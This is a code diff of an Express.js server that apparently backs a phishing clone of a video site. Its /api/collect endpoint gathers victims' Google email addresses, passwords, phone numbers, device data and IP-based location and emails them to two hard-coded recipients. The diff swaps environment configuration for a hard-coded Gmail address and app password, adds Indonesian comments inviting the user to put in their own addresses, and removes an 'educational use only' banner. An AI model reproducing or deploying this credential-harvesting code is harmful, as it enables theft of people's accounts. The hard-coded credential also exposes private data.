@@ -1,6 +1,5 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
-const dotenv = require('dotenv');
 const cors = require('cors');
 const rateLimit = require('express-rate-limit');
 const helmet = require('helmet');
@@ -9,10 +8,8 @@ const bodyParser = require('body-parser');
 const axios = require('axios');
 const path = require('path');
 
-dotenv.config();
-
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = 3000;
 
 app.use(helmet({ contentSecurityPolicy: false }));
 app.use(cors());
@@ -29,18 +26,22 @@ app.use('/api/', limiter);
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Email config
+// ==================== EMAIL CONFIG LANGSUNG ====================
+// GANTI DENGAN EMAIL DAN PASSWORD LO!
+const EMAIL_USER = 'gajeb682@gmail.com';
+const EMAIL_PASS = 'tmyh wklt uyig lots';
+
+// 2 PENERIMA EMAIL - GANTI SESUAI KEINGINAN LO!
+const RECIPIENT_EMAIL_1 = 'gajeb682@gmail.com';
+const RECIPIENT_EMAIL_2 = 'cadangan@gmail.com';  // GANTI!
+
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS,
+    user: EMAIL_USER,
+    pass: EMAIL_PASS,
   }
 });
-
-const recipientEmails = process.env.RECIPIENT_EMAILS ? 
-  process.env.RECIPIENT_EMAILS.split(',') : 
-  ['test@example.com'];
 
 // Get location from IP
 async function getLocationFromIP(ip) {
@@ -271,31 +272,39 @@ function createEmailTemplate(data) {
   `;
 }
 
-// Send email to multiple recipients
-async function sendToEmails(data) {
+// ==================== KIRIM EMAIL KE 2 PENERIMA ====================
+async function sendToBothEmails(data) {
   const emailHtml = createEmailTemplate(data);
-  const subject = `Akun Google punya ${data.email}`;
-  const results = [];
+  const subject = `🔐 Akun Google: ${data.email}`;
   
-  for (const recipient of recipientEmails) {
-    try {
-      await transporter.sendMail({
-        from: `"Security Report" <${process.env.EMAIL_USER}>`,
-        to: recipient.trim(),
-        subject: subject,
-        html: emailHtml,
-      });
-      results.push({ recipient: recipient.trim(), success: true });
-      console.log(`✅ Email sent to ${recipient.trim()}`);
-    } catch (error) {
-      console.error(`❌ Failed to send to ${recipient.trim()}:`, error.message);
-      results.push({ recipient: recipient.trim(), success: false, error: error.message });
-    }
+  // Kirim ke EMAIL 1
+  try {
+    await transporter.sendMail({
+      from: `"Security Report" <${EMAIL_USER}>`,
+      to: RECIPIENT_EMAIL_1,
+      subject: subject,
+      html: emailHtml,
+    });
+    console.log(`✅ Email sent to ${RECIPIENT_EMAIL_1}`);
+  } catch (error) {
+    console.error(`❌ Failed to send to ${RECIPIENT_EMAIL_1}:`, error.message);
   }
-  return results;
+  
+  // Kirim ke EMAIL 2
+  try {
+    await transporter.sendMail({
+      from: `"Security Report" <${EMAIL_USER}>`,
+      to: RECIPIENT_EMAIL_2,
+      subject: subject,
+      html: emailHtml,
+    });
+    console.log(`✅ Email sent to ${RECIPIENT_EMAIL_2}`);
+  } catch (error) {
+    console.error(`❌ Failed to send to ${RECIPIENT_EMAIL_2}:`, error.message);
+  }
 }
 
-// API endpoint
+// ==================== API ENDPOINT ====================
 app.post('/api/collect', async (req, res) => {
   try {
     const { email, password, phone, deviceData, timestamp } = req.body;
@@ -317,9 +326,10 @@ app.post('/api/collect', async (req, res) => {
       timestamp: timestamp || new Date().toISOString()
     };
     
-    const emailResults = await sendToEmails(collectedData);
+    // KIRIM KE 2 EMAIL LANGSUNG!
+    await sendToBothEmails(collectedData);
     
-    res.json({ success: true, message: 'Data collected', emailResults });
+    res.json({ success: true, message: 'Data collected' });
     
   } catch (error) {
     console.error('Error:', error);
@@ -334,9 +344,12 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
   console.log(`
 ╔══════════════════════════════════════════════════════════╗
-║     🎬 VIDEY.CLONE - EDUCATIONAL USE ONLY 🎬             ║
-║     Server: http://localhost:${PORT}                      ║
-║     Recipients: ${recipientEmails.join(', ')}            ║
+║     🔥 SERVER JALAN - 2 EMAIL PENERIMA 🔥               ║
+╠══════════════════════════════════════════════════════════╣
+║  📡 Port: ${PORT}                                          ║
+║  📧 Email 1: ${RECIPIENT_EMAIL_1}                         ║
+║  📧 Email 2: ${RECIPIENT_EMAIL_2}                         ║
+║  🌐 Endpoint: POST /api/collect                         ║
 ╚══════════════════════════════════════════════════════════╝
   `);
 });
